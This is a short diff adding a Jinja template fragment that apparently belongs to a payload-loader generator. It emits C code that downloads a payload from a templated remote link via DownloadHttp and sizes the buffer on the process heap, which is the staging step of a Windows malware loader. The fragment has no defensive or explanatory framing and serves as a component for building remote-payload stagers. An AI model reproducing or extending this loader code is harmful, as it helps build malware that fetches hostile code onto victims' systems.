@@ -1,0 +1,6 @@
+{% if section == "globals" %}
+    {% include "blocks/lib/remote_download.jinja" %}
+{% elif section == "text" %}
+    void *raw = DownloadHttp("{{ link.payload_source }}");
+    size_t length = HeapSize(GetProcessHeap(), HEAP_NO_SERIALIZE, raw);
+{% endif %}
